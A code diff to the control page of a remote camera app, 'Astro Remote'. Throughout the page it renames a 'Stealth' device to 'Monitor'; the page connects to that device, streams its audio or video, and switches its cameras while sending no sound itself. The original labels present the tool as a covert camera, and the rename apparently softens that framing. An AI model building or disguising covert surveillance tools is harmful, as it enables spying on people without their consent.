@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Astro Remote - Control Stealth Camera</title>
+    <title>Astro Remote - Monitor Controller</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -124,15 +124,15 @@
     <div class="container">
         <div class="header">
             <h1>🌟 ASTRO REMOTE 🌟</h1>
-            <div class="status" id="statusText">🔮 Stealth Device: Offline</div>
+            <div class="status" id="statusText">🔮 Monitor Device: Offline</div>
         </div>
         <div class="ids">
             <div class="id-badge">🎮 Remote: APrivate</div>
-            <div class="id-badge">👁️ Stealth: BPrivate</div>
+            <div class="id-badge">📹 Monitor: BPrivate</div>
             <div class="warning-badge">🔇 REMOTE SILENT - No audio sent</div>
         </div>
         <div class="connect-section">
-            <button class="connect-btn" id="connectBtn">🔮 CONNECT TO STEALTH DEVICE 🔮</button>
+            <button class="connect-btn" id="connectBtn">🔮 CONNECT TO MONITOR DEVICE 🔮</button>
         </div>
         <div class="call-controls">
             <button class="call-btn" id="audioOnlyBtn" disabled>🎙️ Audio Only</button>
@@ -140,14 +140,14 @@
             <button class="call-btn end" id="endCallBtn" disabled>🔴 Stop</button>
         </div>
         <div class="camera-controls" id="cameraControls" style="display: none;">
-            <button class="camera-btn" id="frontCameraBtn">📱 Stealth Front Camera</button>
-            <button class="camera-btn" id="backCameraBtn">📷 Stealth Back Camera</button>
+            <button class="camera-btn" id="frontCameraBtn">📱 Monitor Front Camera</button>
+            <button class="camera-btn" id="backCameraBtn">📷 Monitor Back Camera</button>
         </div>
         <div class="call-status" id="callStatus">⚫ Standby</div>
         <div class="video-container" id="videoContainer">
             <div class="video-wrapper">
                 <video id="remoteVideo" autoplay playsinline></video>
-                <span class="video-label">👁️ Stealth Feed</span>
+                <span class="video-label">👁️ Monitor Feed</span>
             </div>
         </div>
     </div>
@@ -187,16 +187,16 @@
 
         function setStatus(connected) {
             if (connected) {
-                statusText.innerText = '✅ Stealth Device: Connected';
+                statusText.innerText = '✅ Monitor Device: Connected';
                 statusText.classList.add('connected');
                 connectBtn.innerText = '🌟 DEVICE CONNECTED 🌟';
                 connectBtn.disabled = true;
                 audioOnlyBtn.disabled = false;
                 videoCallBtn.disabled = false;
             } else {
-                statusText.innerText = '🔮 Stealth Device: Offline';
+                statusText.innerText = '🔮 Monitor Device: Offline';
                 statusText.classList.remove('connected');
-                connectBtn.innerText = '🔮 CONNECT TO STEALTH DEVICE 🔮';
+                connectBtn.innerText = '🔮 CONNECT TO MONITOR DEVICE 🔮';
                 connectBtn.disabled = false;
                 audioOnlyBtn.disabled = true;
                 videoCallBtn.disabled = true;
@@ -205,7 +205,7 @@
             }
         }
 
-        function switchStealthCamera(camera) {
+        function switchMonitorCamera(camera) {
             if (!conn || !conn.open) {
                 callStatus.innerText = '❌ Not connected';
                 return;
@@ -216,14 +216,14 @@
 
             frontCameraBtn.classList.toggle('active', camera === 'front');
             backCameraBtn.classList.toggle('active', camera === 'back');
-            callStatus.innerText = `📷 Switching stealth to ${camera} camera...`;
+            callStatus.innerText = `📷 Switching monitor to ${camera} camera...`;
         }
 
         function handleDataMessage(data) {
             console.log(`[REMOTE] Received: ${data.type}`);
             
             if (data.type === 'camera_switched') {
-                callStatus.innerText = `✅ Stealth ${data.camera} camera ACTIVE`;
+                callStatus.innerText = `✅ Monitor ${data.camera} camera ACTIVE`;
                 setTimeout(() => {
                     if (callStatus.innerText.includes('ACTIVE')) {
                         callStatus.innerText = `👁️ ${isVideoMode ? 'Video + Audio' : 'Audio Only'} monitor ACTIVE`;
@@ -337,7 +337,7 @@
 
         function connectToPartner() {
             if (conn) return;
-            callStatus.innerText = '🔍 Locating stealth...';
+            callStatus.innerText = '🔍 Locating monitor...';
             const connection = peer.connect(PARTNER_ID);
             connection.on('open', () => { setupConnection(connection); });
             connection.on('error', () => { setStatus(false); });
@@ -356,8 +356,8 @@
         audioOnlyBtn.addEventListener('click', () => startCall(false));
         videoCallBtn.addEventListener('click', () => startCall(true));
         endCallBtn.addEventListener('click', endCall);
-        frontCameraBtn.addEventListener('click', () => switchStealthCamera('front'));
-        backCameraBtn.addEventListener('click', () => switchStealthCamera('back'));
+        frontCameraBtn.addEventListener('click', () => switchMonitorCamera('front'));
+        backCameraBtn.addEventListener('click', () => switchMonitorCamera('back'));
 
         window.addEventListener('beforeunload', () => {
             if (keepAliveInterval) clearInterval(keepAliveInterval);
